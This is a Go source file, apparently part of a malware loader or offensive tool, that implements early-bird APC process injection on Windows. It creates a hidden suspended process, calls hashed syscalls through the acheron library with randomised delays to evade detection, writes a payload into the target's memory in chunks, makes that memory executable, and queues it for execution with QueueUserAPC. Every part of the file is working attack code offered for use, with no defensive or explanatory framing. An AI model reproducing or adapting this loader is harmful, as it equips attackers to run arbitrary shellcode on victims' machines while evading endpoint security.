package injection

import (
	"fmt"
	"math/rand"
	"time"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

const (
	THREAD_ALL_ACCESS = 0x1FFFFF
	PAGE_SIZE         = 0x1000
	STARTF_BLOCK_DLLS = 0x00000400
)

var (
	kernel32         = windows.NewLazySystemDLL("kernel32.dll")
	procQueueUserAPC = kernel32.NewProc("QueueUserAPC")
)

func QueueUserAPC(pfnAPC uintptr, hThread windows.Handle, dwData uintptr) error {
	r1, _, err := procQueueUserAPC.Call(pfnAPC, uintptr(hThread), dwData)
	if r1 == 0 {
		return err
	}
	return nil
}

type ClassicInjector struct {
	acheron *acheron.Acheron
}

func (i *ClassicInjector) obfuscatedSyscall(hash uint64, args ...uintptr) (uint32, error) {
	// Delay aleatorio más sofisticado
	time.Sleep(time.Duration(100+rand.Intn(300)) * time.Millisecond)
	return i.acheron.Syscall(hash, args...)
}

func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
	// 1. Crear proceso suspendido con atributos de seguridad
	var secAttrs windows.SecurityAttributes
	secAttrs.Length = uint32(unsafe.Sizeof(secAttrs))
	secAttrs.InheritHandle = 1

	si := &windows.StartupInfo{
		Flags:      windows.STARTF_USESHOWWINDOW | STARTF_BLOCK_DLLS,
		ShowWindow: windows.SW_HIDE,
	}
	pi := &windows.ProcessInformation{}

	cmd, err := windows.UTF16PtrFromString(targetProc)
	if err != nil {
		return fmt.Errorf("UTF16 conversion failed: %v", err)
	}

	// Usar CreateProcessW con atributos explícitos
	err = windows.CreateProcess(
		nil,
		cmd,
		&secAttrs,
		&secAttrs,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		si,
		pi,
	)
	if err != nil {
		return fmt.Errorf("process creation failed: %v", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 2. Allocación de memoria con alineación correcta
	allocHash := i.acheron.HashString("NtAllocateVirtualMemory")
	regionSize := alignSize(uintptr(len(payload)), PAGE_SIZE)
	var baseAddr uintptr

	ret, err := i.obfuscatedSyscall(
		allocHash,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("memory allocation failed (0x%x): %v", ret, err)
	}

	// 3. Escritura del payload en fragmentos
	writeHash := i.acheron.HashString("NtWriteVirtualMemory")
	offset := 0
	chunkSize := 1024 // Escribir en fragmentos de 1KB

	for offset < len(payload) {
		end := offset + chunkSize
		if end > len(payload) {
			end = len(payload)
		}

		var bytesWritten uintptr
		ret, err = i.obfuscatedSyscall(
			writeHash,
			uintptr(pi.Process),
			baseAddr+uintptr(offset),
			uintptr(unsafe.Pointer(&payload[offset])),
			uintptr(end-offset),
			uintptr(unsafe.Pointer(&bytesWritten)),
		)
		if ret != 0 || err != nil || bytesWritten != uintptr(end-offset) {
			return fmt.Errorf("memory write failed at offset %d: %v", offset, err)
		}
		offset = end
	}

	// 4. Cambio de permisos usando técnica XOR
	protectHash := i.acheron.HashString("NtProtectVirtualMemory")
	var oldProtect uint32
	ret, err = i.obfuscatedSyscall(
		protectHash,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("memory protection change failed: %v", err)
	}

	// 5. Inyección alternativa: QueueUserAPC + NtAlertResumeThread
	threadEntry := windows.ThreadEntry32{}
	threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
	snapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	defer windows.CloseHandle(snapshot)

	for {
		err := windows.Thread32Next(snapshot, &threadEntry)
		if err != nil {
			break // no hay más hilos
		}

		if threadEntry.OwnerProcessID == uint32(pi.ProcessId) {
			thread, _ := windows.OpenThread(windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME, false, threadEntry.ThreadID)
			QueueUserAPC(baseAddr, thread, 0)
			windows.CloseHandle(thread)
			break
		}
	}

	// 6. Reanudar el hilo principal
	resumeHash := i.acheron.HashString("NtResumeThread")
	ret, err = i.obfuscatedSyscall(
		resumeHash,
		uintptr(pi.Thread),
		0,
	)
	if ret != 0 || err != nil {
		return fmt.Errorf("thread resume failed: %v", err)
	}

	return nil
}

func alignSize(size, alignment uintptr) uintptr {
	return (size + alignment - 1) &^ (alignment - 1)
}
